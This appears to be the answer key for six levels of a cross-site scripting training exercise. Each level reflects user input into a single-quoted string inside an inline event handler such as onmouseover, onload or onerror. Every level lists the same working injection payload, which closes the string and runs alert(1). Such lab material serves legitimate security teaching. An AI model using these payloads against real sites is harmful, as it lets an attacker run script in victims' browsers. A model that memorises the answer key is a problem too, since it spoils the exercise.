# attr-event — solutions

Reflections inside single-quoted JS strings within inline event handlers; close the string and inject JS.

### attr-event-level1

`/attr-event/level1/?query=%27);alert(1)//`

- payload: `');alert(1)//`
- context: onmouseover="show('…')" — needs mouseover; close string + paren

### attr-event-level2

`/attr-event/level2/?query=%27);alert(1)//`

- payload: `');alert(1)//`
- context: onsubmit="validate('…')" — fires on submit

### attr-event-level3

`/attr-event/level3/?query=%27);alert(1)//`

- payload: `');alert(1)//`
- context: body onload="init('…')" — fires on page load

### attr-event-level4

`/attr-event/level4/?query=%27);alert(1)//`

- payload: `');alert(1)//`
- context: img onerror="report('…')" — fires automatically (broken src)

### attr-event-level5

`/attr-event/level5/?query=%27);alert(1)//`

- payload: `');alert(1)//`
- context: input onblur="save('…')" — needs focus then blur

### attr-event-level6

`/attr-event/level6/?query=%27);alert(1)//`

- payload: `');alert(1)//`
- context: button onclick="action('…')" — fires on click
